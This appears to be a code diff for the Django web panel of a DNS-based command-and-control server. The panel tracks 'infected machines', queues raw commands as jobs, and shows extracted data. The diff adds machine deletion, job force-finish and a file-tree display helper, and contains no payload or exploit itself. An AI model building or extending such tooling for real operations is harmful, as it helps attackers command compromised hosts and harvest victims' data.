@@ -23,6 +23,7 @@ from django.http import HttpRequest
 from django.shortcuts import render, redirect
 # from django.contrib import admin
 from django.urls import include, path
+from django.utils import timezone
 from django.views.decorators.http import require_POST
 
 from .models import InfectedMachine, Job
@@ -73,6 +74,14 @@ def show_job_extracted(request: HttpRequest, job_id: int):
     })
 
 @require_POST
+def machine_delete(_: HttpRequest, machine_id: int):
+    machine = InfectedMachine.objects.filter(id=machine_id).first()
+    if machine is not None:
+        machine.delete()
+
+    return redirect('machines')
+
+@require_POST
 def job_create(request: HttpRequest, machine_id: int):
     machine = InfectedMachine.objects.filter(id=machine_id).first()
     raw_command = request.POST.get('command')
@@ -91,10 +100,16 @@ def job_create(request: HttpRequest, machine_id: int):
 def job_delete(_: HttpRequest, job_id: int):
     job = Job.objects.filter(id=job_id).first()
     if job is not None:
-        current_machine_job = job.infected_machine.get_current_job()
-        if current_machine_job is not None and current_machine_job.id == job.id:
-            DnsService().remove_job_txt(job.infected_machine)
         job.delete()
+
+    return redirect('jobs')
+
+@require_POST
+def job_force_finish(_: HttpRequest, job_id: int):
+    job = Job.objects.filter(id=job_id).first()
+    if job is not None:
+        job.jobendqueue_set.create(processable_at=timezone.now())
+        job.finished_at = timezone.now()
 
     return redirect('jobs')
 
@@ -119,27 +134,71 @@ def debug(request: HttpRequest):
         "dns_zone": dns_zone,
     })
 
-def file_tree(folder_path: str, prefix="") -> str:
+def file_tree(folder_path: str, prefix="", squash=True) -> str:
     def natural_sort_key(s):
         return [int(c) if c.isdigit() else c.lower() for c in re.split(r'(\d+)', s)]
 
-    result = f"{folder_path}\n"
-    entries = sorted(os.scandir(folder_path), key=lambda f: natural_sort_key(f.name))
+    def squash_entries(entries):
+        """Group consecutive files matching same base name + number pattern."""
+        result = []
+        i = 0
+        while i < len(entries):
+            entry = entries[i]
+            # Check if filename matches "name-NUMBER" pattern
+            match = re.match(r'^(.+-)(\d+)$', entry.name)
+            if not squash or not match or entry.is_dir():
+                result.append(entry)
+                i += 1
+                continue
+            base, num = match.group(1), int(match.group(2))
+            # Find consecutive sequence
+            j = i + 1
+            expected = num + 1
+            while j < len(entries):
+                m = re.match(r'^(.+-)(\d+)$', entries[j].name)
+                if m and m.group(1) == base and int(m.group(2)) == expected:
+                    expected += 1
+                    j += 1
+                else:
+                    break
+            if j > i + 1:  # at least 2 in sequence
+                result.append((entry, entries[j - 1]))  # (first, last)
+                i = j
+            else:
+                result.append(entry)
+                i += 1
+        return result
+
+    result = f"{folder_path}\n" if prefix == '' else ''
+    raw_entries = sorted(os.scandir(folder_path), key=lambda f: natural_sort_key(f.name))
+    entries = squash_entries(raw_entries)
+
     for i, entry in enumerate(entries):
         connector = "└── " if i == len(entries) - 1 else "├── "
-        result += prefix + connector + entry.name + ("/" if entry.is_dir() else "") + "\n"
-        if entry.is_dir():
-            extension = "    " if i == len(entries) - 1 else "│   "
-            result += file_tree(entry.path, prefix + extension)
+        if isinstance(entry, tuple):  # squashed range
+            first, last = entry
+            m_first = re.match(r'^(.+-)(\d+)$', first.name)
+            m_last = re.match(r'^(.+-)(\d+)$', last.name)
+            base = m_first.group(1).rstrip('-')
+            n_first, n_last = int(m_first.group(2)), int(m_last.group(2))
+            result += prefix + connector + f"{base}{{{n_first}, {n_first + 1}, ..., {n_last}}}\n"
+        else:
+            result += prefix + connector + entry.name + ("/" if entry.is_dir() else "") + "\n"
+            if entry.is_dir():
+                extension = "    " if i == len(entries) - 1 else "│   "
+                result += file_tree(entry.path, prefix + extension, squash=squash)
+
     return result
 
 urlpatterns = [
     #    path('admin/', admin.site.urls),
     path('', index, name='index'),
     path('machines', machines, name='machines'),
+    path('machine/delete/<int:machine_id>', machine_delete, name='machine_delete'),
     path('jobs', jobs, name='jobs'),
     path('debug', debug, name='debug'),
     path('job/create/<int:machine_id>', job_create, name='job_create'),
+    path('job/force-finish/<int:job_id>', job_force_finish, name='job_force_finish'),
     path('job/delete/<int:job_id>', job_delete, name='job_delete'),
     path('job/show-extracted/<int:job_id>', show_job_extracted, name='show_job_extracted'),
 ]
